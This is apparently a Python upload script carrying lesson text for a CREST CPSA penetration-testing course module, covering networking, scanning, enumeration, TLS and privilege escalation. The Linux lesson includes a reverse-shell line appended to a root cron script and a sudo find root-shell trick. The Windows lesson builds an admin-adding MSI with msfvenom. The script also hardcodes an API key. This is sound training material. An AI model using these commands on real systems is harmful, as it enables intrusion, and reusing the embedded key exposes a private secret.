"""
CourseStack - Push Module B (Core Technical Skills) - Full Content  v1
Creates theory text lessons + lab iframe lessons for every Module B topic.

Module B syllabus topics:
  B1  - IP Protocols and Fundamentals
  B2  - Network Architecture and Devices
  B3  - Network Services and Protocols
  B4  - Network Mapping and Target Identification  (+ Labs B4-A, B4-B, B4-C)
  B5  - Interpreting Tool Output                   (+ Lab B5-A)
  B6  - Vulnerability Scanning and Analysis
  B7  - Web Application Fundamentals
  B8  - OS Fingerprinting                          (+ Lab B8-A)
  B9  - Banner Grabbing and Service ID             (+ Lab B9-A)
  B10 - Enumeration
  B11 - Cryptography and Hashing
  B12 - SSL/TLS
  B13 - Linux Privilege Escalation                 (+ Labs B13-A, B13-B)
  B14 - Windows Privilege Escalation               (+ Labs B14-A, B14-B)

Chapter already created: 91e5dba1-a247-4f2a-bab0-f24f0b3b2af9
Lab lessons already created (content will be patched, not recreated).
"""

import requests
import uuid
import time
from requests.auth import HTTPBasicAuth

API_KEY   = "sk_5e9fde21e45324530a735286f8e28bcecf3e9df298ab37ec016833ed57c4f2e52b215010e457e6f3de80c070d3161ff5"
BASE      = "https://app.coursestack.com"
auth      = HTTPBasicAuth(API_KEY, "")
COURSE_ID = "b9d920c3-4a8e-4227-af24-3c5f32fc7350"
CHAPTER_ID = "91e5dba1-a247-4f2a-bab0-f24f0b3b2af9"
HEADERS   = {"Content-Type": "application/json"}

GH_BASE = "https://heaps1345.github.io/mca-activites/cpsa/module-b"

# Lab lessons already created in the first run - we patch content, not recreate
EXISTING_LAB_LESSONS = {
    "lab-b4a":  "1c337e35-21dd-4fa7-bab0-e65d5ceed997",
    "lab-b4b":  "b16790fe-9668-4cd0-977c-9d9a6457c439",
    "lab-b4c":  "f83ac7d3-5e3f-47e4-a718-83cb41a10ad4",
    "lab-b5a":  "07695254-de1c-442a-8330-27f9918330cf",
    "lab-b8a":  "a8813d7e-47d4-4b29-93f8-3d4628e32ced",
    "lab-b9a":  "bc5997c7-fb8e-4ad1-91f3-c685d6282634",
    "lab-b13a": "09d215ee-979a-430c-821e-af8fb8e0b27c",
    "lab-b13b": "572e93ad-181a-477f-842a-ed92ace5e6e2",
    "lab-b14a": "33b22095-0c08-4de6-b129-42b2f4daf272",
    "lab-b14b": "9fdd3538-3741-45a2-8429-d50cc76108a1",
}


# -------------------------------------------------------
# Theory content
# -------------------------------------------------------

B1_MD = """## B1 - IP Protocols and Fundamentals

### The TCP/IP Model

Modern networks use the TCP/IP stack. Understanding each layer is essential for interpreting tool output and identifying attack surface.

| Layer | Name | Key Protocols |
|-------|------|---------------|
| 4 | Application | HTTP, HTTPS, FTP, SSH, DNS, SMTP |
| 3 | Transport | TCP, UDP |
| 2 | Internet | IP, ICMP, ARP |
| 1 | Network Access | Ethernet, 802.11 Wi-Fi |

### IP Addressing

**IPv4** uses 32-bit addresses written in dotted decimal (e.g. 192.168.1.1). CIDR notation (e.g. /24) defines the network boundary.

**Private ranges (RFC 1918)** - not routable on the public internet:
- 10.0.0.0/8
- 172.16.0.0/12
- 192.168.0.0/16

**Loopback:** 127.0.0.1 - always refers to the local host.

### TCP vs UDP

| Feature | TCP | UDP |
|---------|-----|-----|
| Connection | 3-way handshake | Connectionless |
| Reliability | Guaranteed delivery | Best effort |
| Order | Ordered | Not guaranteed |
| Speed | Slower | Faster |
| Use cases | HTTP, SSH, FTP | DNS, DHCP, VoIP |

### TCP 3-Way Handshake

```
Client          Server
  |--SYN--------->|
  |<------SYN-ACK-|
  |--ACK--------->|
  |  (connected)  |
```

Port states detected by scanners:
- **Open** - SYN-ACK returned (service listening)
- **Closed** - RST returned (no service, but host is up)
- **Filtered** - No response (firewall dropping packets)

### ICMP

ICMP carries control messages. Key types tested in CPSA:
- **Type 0** - Echo Reply (ping response)
- **Type 8** - Echo Request (ping)
- **Type 3** - Destination Unreachable
- **Type 11** - Time Exceeded (used by traceroute)

### Common Port Numbers

| Port | Protocol | Service |
|------|----------|---------|
| 21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 |
| 143 | TCP | IMAP |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB |
| 3389 | TCP | RDP |

### CREST Exam Note

The exam will test your ability to read a packet capture or nmap output and identify the protocol, port, and likely service. Know the common port numbers above by heart.
"""

B2_MD = """## B2 - Network Architecture and Devices

### Network Devices

**Router** - Connects different networks and routes traffic between them at Layer 3 (IP). Maintains a routing table.

**Switch** - Connects devices within the same network at Layer 2 (MAC addresses). Forwards frames based on a MAC address table.

**Firewall** - Filters traffic based on rules (IP, port, protocol, state). Stateful firewalls track connection state.

**Load Balancer** - Distributes traffic across multiple backend servers. Can obscure the real server count from recon.

**Proxy / Reverse Proxy** - Sits between clients and servers. A reverse proxy can strip server headers and mask backend technology.

**IDS/IPS** - Intrusion Detection/Prevention System. Monitors traffic for known attack signatures.

### Network Segmentation

Organisations use VLANs and subnets to segment networks:
- **DMZ** (Demilitarised Zone) - public-facing services (web, mail) isolated from the internal network
- **Internal LAN** - staff workstations and file servers
- **Management network** - out-of-band access to routers, switches, firewalls

### Syntex Network

```
Internet
    |
[Firewall]
    |
[DMZ] - SYNTEX-LNX01 (Ubuntu web server, 10.1.53.39)
    |
[Internal LAN]
    |
SYNTEX-DC01 (Windows Server AD DC, 10.0.29.131)
```

### Reconnaissance Implications

- A load balancer may return different banners on successive connections
- A reverse proxy may present nginx headers while the backend runs IIS
- Firewall rules determine which ports are open vs filtered in nmap output
- VLAN separation means a shell on LNX01 does not automatically give access to DC01

### Common Exam Topics

- Which device operates at Layer 3? **Router**
- What does a stateful firewall track? **Connection state (SYN, ESTABLISHED, FIN)**
- Why might the same IP return different banners? **Load balancer across multiple backends**
"""

B3_MD = """## B3 - Network Services and Protocols

### DNS

DNS resolves hostnames to IP addresses. Key record types:

| Record | Purpose |
|--------|---------|
| A | Hostname to IPv4 address |
| AAAA | Hostname to IPv6 address |
| MX | Mail server for a domain |
| NS | Authoritative name server |
| CNAME | Alias to another hostname |
| PTR | Reverse lookup (IP to hostname) |
| TXT | Arbitrary text (SPF, DMARC, verification) |

DNS zone transfers (AXFR) can reveal the full internal hostname list if not restricted to authorised secondaries.

### DHCP

Dynamically assigns IP addresses. The DORA process:
1. **Discover** - client broadcasts looking for a DHCP server
2. **Offer** - server offers an IP address
3. **Request** - client requests the offered address
4. **Acknowledge** - server confirms the lease

### SMB

Server Message Block - Windows file and printer sharing on port 445. Key for internal enumeration:
- Null sessions (anonymous access) on older configurations
- Share enumeration with `smbclient -L`
- User enumeration via RID cycling

### LDAP

Lightweight Directory Access Protocol - Active Directory query interface on port 389 (636 for LDAPS). Used to enumerate:
- User accounts
- Groups and group membership
- Computer accounts
- Password policy

### Kerberos

Authentication protocol used by Active Directory on port 88. Key attacks:
- **AS-REP Roasting** - accounts with pre-auth disabled
- **Kerberoasting** - requesting service tickets for cracking

### SNMP

Simple Network Management Protocol - used to manage network devices on UDP 161. SNMPv1/v2 uses community strings (default: `public`). Weak configurations can expose device configuration.

### CREST Exam Note

Know which port each service runs on and what information can be extracted from it. DNS, SMB, LDAP and SNMP are all enumeration targets in a grey-box pentest.
"""

B4_MD = """## B4 - Network Mapping and Target Identification

### Objectives

Network mapping establishes the attack surface before exploitation. The goal is to identify:
- Which hosts are alive (host discovery)
- Which ports are open on each host (port scanning)
- What services are running (service enumeration)
- How hosts connect to each other (route mapping)

### Host Discovery

Before port scanning, identify live hosts to avoid wasting time scanning dead IPs.

```bash
# ICMP ping sweep (may be blocked by firewalls)
nmap -sn 10.0.0.0/24

# ARP sweep (Layer 2 - works on local subnet only)
nmap -PR -sn 10.0.0.0/24

# TCP SYN ping to port 443 (useful when ICMP blocked)
nmap -PS443 -sn 10.0.0.0/24
```

### Port Scanning Techniques

| Technique | Flag | How it works |
|-----------|------|-------------|
| SYN scan | -sS | Half-open - sends SYN, doesn't complete handshake. Fast, less noisy |
| Connect scan | -sT | Full TCP handshake. Slower, more detectable |
| UDP scan | -sU | Sends UDP packets. Slow but finds DNS, SNMP, TFTP |
| NULL scan | -sN | No flags set. Can bypass some firewalls |
| FIN scan | -sF | FIN flag only |
| Xmas scan | -sX | FIN+PSH+URG flags |

### Nmap Timing

| Level | Flag | Use case |
|-------|------|----------|
| Paranoid | -T0 | IDS evasion - very slow |
| Sneaky | -T1 | IDS evasion |
| Polite | -T2 | Slower, less impact on target |
| Normal | -T3 | Default |
| Aggressive | -T4 | Fast - good for labs |
| Insane | -T5 | Very fast - may miss results |

### Service Version Detection

```bash
nmap -sV 10.0.0.1              # version detection
nmap -sV --version-intensity 9  # maximum probe intensity
nmap -A 10.0.0.1               # aggressive: OS + version + scripts + traceroute
```

### Output Formats

```bash
nmap -oN scan.txt    # normal (human readable)
nmap -oX scan.xml    # XML (machine parseable)
nmap -oG scan.gnmap  # grepable
nmap -oA scan        # all three formats
```

### Syntex Lab Targets

- **SYNTEX-LNX01** - Ubuntu 20.04 web/app server
- **SYNTEX-DC01** - Windows Server 2016 Active Directory DC

See Labs B4-A, B4-B and B4-C for hands-on exercises covering host discovery, route mapping and port scanning against both targets.
"""

B5_MD = """## B5 - Interpreting Tool Output

### Reading Nmap Output

A basic nmap scan produces output in this format:

```
PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open   http     Apache httpd 2.4.41
443/tcp  open   ssl/http Apache httpd 2.4.41
8080/tcp closed http
3306/tcp filtered mysql
```

Key fields:
- **PORT** - port number and protocol
- **STATE** - open / closed / filtered
- **SERVICE** - nmap's guess at the service name
- **VERSION** - banner or probe result (requires -sV)

### Port States

| State | Meaning |
|-------|---------|
| open | A service is accepting connections |
| closed | No service listening, but host is reachable |
| filtered | Firewall dropping packets - can't determine state |
| open/filtered | Could be either - typically UDP |

### Reading Service Banners

Banners often reveal vendor and version:

```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```
- Protocol: SSH version 2.0
- Software: OpenSSH 8.2p1
- OS hint: Ubuntu (Ubuntu-specific patch level)

```
220 SYNTEX-LNX01 ESMTP Postfix (Ubuntu)
```
- Service: SMTP
- Software: Postfix
- Hostname: SYNTEX-LNX01

### HTTP Headers

HTTP response headers expose server details:

```
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
```

From this single response:
- Web server: IIS 10.0 (maps to Windows Server 2016/2019)
- Application framework: ASP.NET 4.x
- No Content-Security-Policy or X-Frame-Options = potential attack vectors

### Vulnerability Scanner Output

Tools like Nessus and OpenVAS assign severity ratings. Map these to CVSS:

| Scanner Severity | CVSS Range |
|-----------------|------------|
| Critical | 9.0-10.0 |
| High | 7.0-8.9 |
| Medium | 4.0-6.9 |
| Low | 0.1-3.9 |
| Informational | 0.0 |

Always verify scanner findings manually before including them in a report. False positives are common.

### Lab B5-A

Lab B5-A provides real nmap and service scan output from both Syntex targets. Work through the output and answer the analysis questions before the knowledge check.
"""

B6_MD = """## B6 - Vulnerability Scanning and Analysis

### What is Vulnerability Scanning?

Vulnerability scanning is the automated process of probing a target for known weaknesses. Scanners compare observed service versions against a CVE database and flag mismatches.

**Key distinction:** Vulnerability scanning is not exploitation. A scanner reports potential vulnerabilities - a penetration tester must manually verify them.

### Common Vulnerability Scanners

| Tool | Type | Notes |
|------|------|-------|
| Nessus | Commercial | Industry standard, extensive plugin library |
| OpenVAS / Greenbone | Open source | Free alternative to Nessus |
| Qualys | Cloud-based SaaS | Used for continuous monitoring |
| Nexpose | Commercial | Strong AD integration |
| nmap NSE | Open source | Script-based, lightweight |

### Authenticated vs Unauthenticated Scans

**Unauthenticated** - scanner has no credentials. Only sees what an external attacker sees. Misses local privilege escalation vectors and patch levels.

**Authenticated** - scanner logs in with provided credentials. Can check installed patch levels, local config, and exposed file permissions. More accurate, more comprehensive.

Always run authenticated scans where possible in a grey-box engagement.

### CVE and CVSS

**CVE** (Common Vulnerabilities and Exposures) - unique identifier for a known vulnerability. Format: CVE-YYYY-NNNNN.

**CVSS v3.1** (Common Vulnerability Scoring System) - 0.0 to 10.0 score based on:
- **Attack Vector** - Network / Adjacent / Local / Physical
- **Attack Complexity** - Low / High
- **Privileges Required** - None / Low / High
- **User Interaction** - None / Required
- **Scope** - Unchanged / Changed
- **Confidentiality Impact** - None / Low / High
- **Integrity Impact** - None / Low / High
- **Availability Impact** - None / Low / High

### False Positives and False Negatives

**False positive** - scanner reports a vulnerability that does not exist. Common causes: version string mismatch (patched but version unchanged), scanner logic errors.

**False negative** - scanner misses a real vulnerability. Common causes: authenticated scan not run, custom software, zero-day.

**Always manually verify** critical and high findings before reporting.

### CREST Exam Note

The CPSA exam tests your ability to interpret scanner output and assign correct CVSS scores. Know all eight CVSS v3.1 base metrics and their values.
"""

B7_MD = """## B7 - Web Application Fundamentals

### HTTP Request and Response

**Request:**
```
GET /login HTTP/1.1
Host: syntex.local
Cookie: session=abc123
User-Agent: Mozilla/5.0
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Server: Microsoft-IIS/10.0
Set-Cookie: session=xyz789; HttpOnly; Secure

<html>...</html>
```

### HTTP Methods

| Method | Purpose |
|--------|---------|
| GET | Retrieve a resource |
| POST | Submit data (forms, JSON) |
| PUT | Replace a resource |
| PATCH | Partially update a resource |
| DELETE | Remove a resource |
| OPTIONS | Discover allowed methods |
| HEAD | GET without the body |

### HTTP Status Codes

| Code | Meaning |
|------|---------|
| 200 | OK |
| 301 | Moved Permanently |
| 302 | Found (temporary redirect) |
| 400 | Bad Request |
| 401 | Unauthorised (authentication required) |
| 403 | Forbidden (authenticated but not authorised) |
| 404 | Not Found |
| 500 | Internal Server Error |
| 503 | Service Unavailable |

### Security Headers

| Header | Purpose | Missing = Risk |
|--------|---------|----------------|
| Content-Security-Policy | Controls resource loading | XSS |
| X-Frame-Options | Prevents clickjacking | Clickjacking |
| X-Content-Type-Options | Prevents MIME sniffing | Content injection |
| Strict-Transport-Security | Forces HTTPS | SSL stripping |
| Referrer-Policy | Controls referrer header leakage | Information disclosure |

### OWASP Top 10 (2021)

Key categories tested at CPSA level:
1. **Broken Access Control** - accessing resources without authorisation
2. **Injection** - SQL, OS command, LDAP injection
3. **Cryptographic Failures** - weak/missing encryption
4. **Insecure Design** - architectural security flaws
5. **Security Misconfiguration** - default credentials, verbose errors, directory listing

### Session Management

Sessions identify authenticated users. Vulnerabilities:
- **Session fixation** - attacker sets the session ID before login
- **Session hijacking** - stealing a valid session cookie
- **Insecure cookie flags** - missing HttpOnly (JS access) or Secure (HTTP transmission)

### Syntex Application Context

The Syntex web application runs on SYNTEX-LNX01 (Apache/PHP) and SYNTEX-DC01 (IIS/ASP.NET). Web enumeration will be covered in the recon and enumeration labs.
"""

B8_MD = """## B8 - OS Fingerprinting

### What is OS Fingerprinting?

OS fingerprinting identifies the operating system of a remote host by analysing differences in TCP/IP stack implementations. Different operating systems respond differently to the same network probes.

### Passive vs Active Fingerprinting

**Passive** - analyse traffic already present without sending probes. Tools: p0f. No additional packets sent to the target.

**Active** - send crafted probes and analyse responses. Tools: nmap -O. More accurate but detectable.

### Nmap OS Detection

```bash
nmap -O 10.0.0.1              # OS detection (requires root/admin)
nmap -O --osscan-guess 10.0.0.1  # guess even with limited data
nmap -A 10.0.0.1              # all detection: OS + version + scripts
```

Nmap uses a fingerprint database of thousands of OS signatures. It reports:
- OS family (Linux, Windows, FreeBSD)
- Version range (e.g. Windows Server 2016-2019)
- Confidence percentage

### TTL Values

Default TTL values are OS-specific. Useful for quick identification from a ping or traceroute:

| OS | Default TTL |
|----|-------------|
| Linux | 64 |
| Windows | 128 |
| Cisco IOS | 255 |
| macOS | 64 |

TTL decrements by 1 at each router hop. A TTL of 127 arriving at your machine likely came from a Windows host 1 hop away.

### Banner Analysis

OS hints appear in service banners:
- `OpenSSH_8.2p1 Ubuntu-4ubuntu0.5` - Ubuntu Linux
- `Microsoft-IIS/10.0` - Windows Server 2016 or 2019
- `Samba 4.x.x` - Linux running Samba (looks like Windows SMB)

### Limitations

- Firewalls and load balancers can mask or alter TCP/IP behaviour
- TTL manipulation can defeat passive fingerprinting
- Aggressive nmap OS detection is noisy and may trigger IDS alerts

See **Lab B8-A** for a hands-on exercise fingerprinting both Syntex targets.
"""

B9_MD = """## B9 - Banner Grabbing and Service Identification

### What is Banner Grabbing?

Banner grabbing is the technique of connecting to a service and reading the welcome message (banner) it presents before authentication. Banners often contain:
- Software name and version
- Operating system hints
- Hostname
- Configuration details

### Manual Banner Grabbing

**Netcat** for raw TCP connections:
```bash
nc -v <target> 22      # SSH banner
nc -v <target> 21      # FTP banner
nc -v <target> 25      # SMTP banner
```

**Curl** for HTTP headers:
```bash
curl -I http://<target>          # HEAD request
curl -v http://<target>          # verbose - shows request and response headers
```

### Automated Banner Grabbing

```bash
nmap --script banner <target>           # grab banners on all open ports
nmap -sV --version-intensity 9 <target> # maximum version detection
whatweb http://<target>                 # web technology fingerprinting
```

### Information Disclosure in HTML Source

Web pages often contain developer comments exposing sensitive information:

```html
<!-- TODO: remove before prod - admin:P@ssw0rd -->
<!-- DB: mysql://syntex_app:dbpass123@localhost/syntex -->
<!-- DEBUG mode enabled - disable in config.php -->
```

These are classified as **High severity** findings in a CREST report - credentials exposed in unauthenticated content.

### Severity Classification

| Finding | Severity | Reasoning |
|---------|----------|-----------|
| Credentials in HTML comments | High | Direct access to systems |
| Server version in headers | Low-Medium | Enables targeted exploitation |
| Hostname in banner | Informational | Minor intelligence value |
| Software version in banner | Low-Medium | Enables CVE lookup |

### Suppressing Banners

Good hardening removes or alters banners:
- Apache: `ServerTokens Prod` (hides version)
- Nginx: `server_tokens off`
- IIS: Remove `Server` header via URL Rewrite
- SSH: Remove `DebianBanner yes` from sshd_config

See **Lab B9-A** for hands-on banner grabbing against both Syntex targets.
"""

B10_MD = """## B10 - Enumeration

### What is Enumeration?

Enumeration is the systematic extraction of detailed information from target services after initial discovery. Where scanning identifies open ports, enumeration extracts usernames, shares, policies, and configuration from those services.

### SMB Enumeration

```bash
# List shares (null session)
smbclient -L //<target> -N

# List shares (authenticated)
smbclient -L //<target> -U jsmith%Password1

# Enumerate with enum4linux
enum4linux -a <target>

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users <target>
```

Key information extracted:
- Share names and permissions
- Usernames and RIDs
- Password policy (minimum length, lockout threshold)
- OS version and domain name

### LDAP Enumeration

```bash
# Unauthenticated LDAP query
ldapsearch -x -H ldap://<target> -b "DC=syntex,DC=local"

# Authenticated
ldapsearch -x -H ldap://<target> -D "jsmith@syntex.local" -w "Password1" \
  -b "DC=syntex,DC=local" "(objectClass=user)" sAMAccountName

# Enumerate with nmap
nmap --script ldap-search <target>
```

### SNMP Enumeration

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target>

# Walk the MIB tree
snmpwalk -v2c -c public <target>

# Get specific OID (system info)
snmpget -v2c -c public <target> 1.3.6.1.2.1.1.1.0
```

### RPC Enumeration

```bash
# Enumerate RPC endpoints
rpcclient -U "" -N <target>
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> querydominfo
```

### DNS Enumeration

```bash
# Zone transfer attempt
dig axfr syntex.local @<dc-ip>

# Reverse lookup
dig -x 10.0.29.131

# Brute force subdomains
dnsenum --dnsserver <target> syntex.local
```

### Syntex Enumeration Targets

- **SYNTEX-DC01** - AD DS, LDAP (389/636), SMB (445), Kerberos (88), RPC (135)
- **SYNTEX-LNX01** - SMB via Samba, NFS (2049), web application

### CREST Exam Note

Know which tool to use for each protocol and what information each tool can extract. Null session SMB and unauthenticated LDAP are common exam scenarios.
"""

B11_MD = """## B11 - Cryptography and Hashing

### Symmetric Encryption

The same key is used to encrypt and decrypt. Fast - suitable for bulk data encryption.

| Algorithm | Key Size | Notes |
|-----------|----------|-------|
| AES-128 | 128-bit | Current standard - secure |
| AES-256 | 256-bit | Used for top secret (US Gov) |
| 3DES | 168-bit effective | Deprecated - slow |
| DES | 56-bit | Broken - do not use |
| RC4 | Variable | Broken - used in old WEP/SSL |

### Asymmetric Encryption

Different keys for encryption (public) and decryption (private). Slower - used for key exchange and digital signatures.

| Algorithm | Key Size | Use |
|-----------|----------|-----|
| RSA | 2048/4096-bit | TLS, SSH, email encryption |
| ECDSA | 256-bit | TLS certificates (faster than RSA) |
| Diffie-Hellman | 2048-bit+ | Key exchange |
| ElGamal | 2048-bit+ | PGP encryption |

### Hashing Algorithms

Hashing produces a fixed-size digest from input data. One-way function - you cannot reverse a hash to get the original.

| Algorithm | Output Size | Status |
|-----------|-------------|--------|
| MD5 | 128-bit (32 hex) | Broken - collisions proven |
| SHA-1 | 160-bit (40 hex) | Deprecated - weak |
| SHA-256 | 256-bit (64 hex) | Current standard |
| SHA-512 | 512-bit (128 hex) | High security |
| bcrypt | Variable | Password hashing - slow by design |
| NTLM | 128-bit | Windows passwords - no salt |

### Password Storage

**Bad:** Plaintext or unsalted MD5/SHA-1
**Better:** SHA-256 with unique per-user salt
**Best:** bcrypt / scrypt / Argon2 (slow by design - resists GPU cracking)

### Windows Password Hashes

Windows stores credentials as NTLM hashes in the SAM database (or NTDS.dit on DCs):

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f3f6e2b8b8b85e9baf3d8b8b8b85e9b:::
```

Format: `username:RID:LM_hash:NTLM_hash:::`

LM hash is disabled by default from Vista onwards (replaced with `aad3b435...` placeholder).

### Common Hash Cracking Tools

```bash
# Hashcat - GPU accelerated
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Online lookup (known hashes)
# crackstation.net, hashes.com
```

### CREST Exam Note

Know MD5 output length (32 hex chars), SHA-256 (64 hex chars), and which algorithms are considered broken. Understand that NTLM has no salt, making it vulnerable to rainbow table attacks.
"""

B12_MD = """## B12 - SSL/TLS

### What is TLS?

Transport Layer Security (TLS) provides encryption, authentication and integrity for network communications. It replaced SSL (which is now broken and should never be used).

### Protocol Versions

| Version | Status | Notes |
|---------|--------|-------|
| SSL 2.0 | Broken | DROWN attack |
| SSL 3.0 | Broken | POODLE attack |
| TLS 1.0 | Deprecated | BEAST attack - PCI DSS prohibited since 2018 |
| TLS 1.1 | Deprecated | Removed from browsers 2020 |
| TLS 1.2 | Current | Acceptable with strong ciphers |
| TLS 1.3 | Current/Best | Fastest, most secure |

### TLS Handshake (TLS 1.2)

```
Client                    Server
  |--ClientHello--------->|   (supported versions, cipher suites, random)
  |<------ServerHello-----|   (chosen version, chosen cipher, random)
  |<------Certificate-----|   (server's X.509 certificate)
  |<--ServerHelloDone-----|
  |--ClientKeyExchange--->|   (pre-master secret encrypted with server's public key)
  |--ChangeCipherSpec---->|
  |--Finished------------>|
  |<--ChangeCipherSpec----|
  |<--Finished------------|
  |    (encrypted data)   |
```

### Certificate Components

An X.509 certificate contains:
- **Subject** - the entity the certificate belongs to (CN=syntex.local)
- **Issuer** - the Certificate Authority that signed it
- **Valid From / Valid To** - validity period
- **Public Key** - RSA or ECDSA public key
- **Subject Alternative Names (SANs)** - additional hostnames covered
- **Signature** - CA's digital signature proving authenticity

### Common TLS Vulnerabilities

| Vulnerability | Protocol | Impact |
|--------------|----------|--------|
| POODLE | SSL 3.0 | Decrypt HTTPS traffic |
| BEAST | TLS 1.0 | Decrypt session cookies |
| CRIME/BREACH | TLS compression | Recover secrets from compressed traffic |
| HEARTBLEED | OpenSSL 1.0.1 | Read server memory (CVE-2014-0160) |
| DROWN | SSL 2.0 coexistence | Decrypt RSA-protected traffic |
| ROBOT | RSA key exchange | Decrypt recorded traffic |

### Testing TLS Configuration

```bash
# SSLScan - comprehensive TLS check
sslscan <target>:443

# testssl.sh - detailed analysis
./testssl.sh <target>

# Nmap TLS scripts
nmap --script ssl-enum-ciphers -p 443 <target>
nmap --script ssl-heartbleed -p 443 <target>
```

### Weak Cipher Suites

Avoid:
- RC4 - broken stream cipher
- DES/3DES - weak block cipher (SWEET32 attack on 3DES)
- NULL ciphers - no encryption
- EXPORT ciphers - intentionally weakened (FREAK, Logjam)
- MD5/SHA-1 in signatures

Prefer:
- AES-GCM (AEAD - authenticated encryption)
- ECDHE for key exchange (forward secrecy)
- SHA-256 or SHA-384 for MAC

### CREST Exam Note

Know which SSL/TLS versions are broken, which common attacks exploit them, and what a missing or expired certificate means in terms of risk. Heartbleed (CVE-2014-0160) is commonly tested.
"""

B13_MD = """## B13 - Linux Privilege Escalation

### What is Privilege Escalation?

Privilege escalation is the process of gaining higher permissions than those initially obtained. On Linux, the goal is typically to achieve **root** (UID 0) access from a low-privilege shell.

### Enumeration First

Before attempting exploitation, enumerate systematically:

```bash
id                          # current user and groups
sudo -l                     # what can this user run as root?
cat /etc/passwd             # all users on the system
cat /etc/shadow             # hashed passwords (requires root or shadow group)
uname -a                    # kernel version
cat /etc/os-release         # OS and version
ps aux                      # running processes
ss -tlnp                    # listening services
```

### SUID/SGID Binaries

SUID (Set User ID) binaries run with the file owner's permissions regardless of who executes them. If a SUID binary is owned by root and can be abused, it grants root access.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null
```

Reference GTFOBins (gtfobins.github.io) for exploitation techniques for known SUID binaries.

### Sudo Misconfigurations

```bash
sudo -l     # list what this user can run as root
```

Common misconfigurations:
- `(ALL) NOPASSWD: /usr/bin/find` - can be used to spawn a root shell
- `(ALL) NOPASSWD: /usr/bin/vim` - can edit /etc/passwd or spawn shell
- `(ALL) NOPASSWD: ALL` - full root access

GTFOBins escalation via find:
```bash
sudo find /etc/passwd -exec /bin/bash \\;
```

### Writable Cron Jobs

Cron jobs running as root with world-writable scripts are critical vulnerabilities:

```bash
cat /etc/crontab
ls -la /etc/cron.*
find / -writable -name "*.sh" 2>/dev/null
```

If a root cron executes a script you can write to, append a reverse shell:
```bash
echo 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1' >> /path/to/script.sh
```

### NFS no_root_squash

NFS shares configured with `no_root_squash` allow a remote root user to write files as root on the share:

```bash
# Check exports
showmount -e <target>
cat /etc/exports

# Mount as root from Kali and create SUID binary
mount -t nfs <target>:/exports /mnt/nfs
gcc suid.c -o /mnt/nfs/rootme
chmod u+s /mnt/nfs/rootme
```

### Kernel Exploits

If the kernel version is old, public exploits may exist:
```bash
uname -a          # kernel version
searchsploit linux kernel 4.4    # search exploit-db
```

Kernel exploits are high risk - can crash the system. Use only as a last resort.

### Findings Classification

| Vector | CVSS Severity |
|--------|--------------|
| SUID custom binary | Critical |
| World-writable root cron | Critical |
| sudo NOPASSWD (single binary) | High |
| NFS no_root_squash | High |
| Kernel CVE | Critical |

See **Labs B13-A and B13-B** for hands-on exercises covering SUID, cron, sudo NOPASSWD and NFS exploitation against SYNTEX-LNX01.
"""

B14_MD = """## B14 - Windows Privilege Escalation

### Windows Privilege Levels

| Account | Privileges |
|---------|-----------|
| SYSTEM | Highest - kernel level |
| Administrator (local) | Full admin on local machine |
| Domain Admin | Full admin on domain |
| Standard User | Limited - no admin rights |
| Service Account | Varies - often elevated |

The goal from a low-privilege shell is typically to reach SYSTEM or Administrator.

### Enumeration First

```cmd
whoami /priv                      # current privileges
net localgroup administrators     # local admin group members
systeminfo                        # OS, patches, hotfixes
wmic qfe list brief               # installed patches
```

### Unquoted Service Paths

Windows services with spaces in the path and no quotes allow DLL/binary hijacking:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\"
```

If a service path is `C:\\Program Files\\My App\\service.exe` (no quotes), Windows tries:
1. `C:\\Program.exe`
2. `C:\\Program Files\\My.exe`
3. `C:\\Program Files\\My App\\service.exe`

Place a malicious binary at one of these locations and restart the service.

### Weak Service Binary ACLs

If you have write permission to a service's executable, replace it with a payload:

```cmd
icacls "C:\\Program Files\\Syntex Solutions\\service.exe"
```

Look for `BUILTIN\\Users:(F)` or `BUILTIN\\Users:(W)` - full or write access.

### AlwaysInstallElevated

If both registry keys are set to 1, any user can install MSI packages as SYSTEM:

```cmd
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
```

Exploit:
```bash
# On Kali: create malicious MSI
msfvenom -p windows/adduser USER=hacked PASS=Hacked123! -f msi -o evil.msi

# Transfer to target and install
msiexec /quiet /qn /i evil.msi
```

### Token Impersonation

If the account has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, potato attacks may apply:
- **PrintSpoofer** - Windows 10 / Server 2016+
- **RoguePotato** - Server 2019+
- **JuicyPotato** - older Windows (patched in Server 2019)

### Windows vs Linux Comparison

| Linux | Windows Equivalent |
|-------|-------------------|
| SUID binary | Weak service binary ACL |
| Writable cron job | Writable scheduled task |
| sudo NOPASSWD | AlwaysInstallElevated |
| PATH hijack | Unquoted service path |

### Findings Classification

| Vector | CVSS Severity |
|--------|--------------|
| AlwaysInstallElevated | High |
| Unquoted service path | Medium-High |
| Weak service binary ACL | High |
| Token impersonation | High |

See **Labs B14-A and B14-B** for hands-on exercises covering process enumeration, socket enumeration, and Windows privilege escalation against SYNTEX-DC01.
"""


# -------------------------------------------------------
# API helpers
# -------------------------------------------------------

def uid():
    return str(uuid.uuid4()).replace("-", "")


def api_post(path, payload):
    url = f"{BASE}{path}"
